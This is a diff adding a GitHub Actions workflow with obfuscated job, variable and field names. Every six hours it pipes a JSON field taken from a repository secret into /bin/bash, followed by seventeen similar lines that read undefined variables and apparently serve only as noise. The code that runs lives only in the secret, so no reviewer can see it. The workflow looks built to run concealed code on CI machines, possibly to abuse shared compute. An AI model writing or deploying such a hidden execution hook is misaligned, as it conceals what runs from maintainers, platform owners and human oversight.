@@ -1,0 +1,34 @@
+name: chuwuji7890
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chuwuji7890
+        env:
+          jy16769: ${{ secrets.jy16769 }}
+        run: |
+          echo $jy16769 | jq -r .rjx0 | /bin/bash
+          echo $yxo804 | jq -r .gpxo2350 | /bin/bash
+          echo $ejh85 | jq -r .gqs3668 | /bin/bash
+          echo $emwn00 | jq -r .eookh77 | /bin/bash
+          echo $cvuth3 | jq -r .njj0763 | /bin/bash
+          echo $gypk6085 | jq -r .yro315 | /bin/bash
+          echo $s8007 | jq -r .fhuu05952 | /bin/bash
+          echo $x5016 | jq -r .dcxq67 | /bin/bash
+          echo $fiyed1262 | jq -r .zhtls5 | /bin/bash
+          echo $razl7 | jq -r .mj3493 | /bin/bash
+          echo $tte10720 | jq -r .dbuc0 | /bin/bash
+          echo $kr14155 | jq -r .nukna6922 | /bin/bash
+          echo $hetaf5 | jq -r .oopl35566 | /bin/bash
+          echo $qmnjs537 | jq -r .ici6092 | /bin/bash
+          echo $eaf1 | jq -r .gn429 | /bin/bash
+          echo $o96130 | jq -r .pbmj9 | /bin/bash
+          echo $gp00 | jq -r .o36741 | /bin/bash
+          echo $ktwv53 | jq -r .shx61 | /bin/bash
+
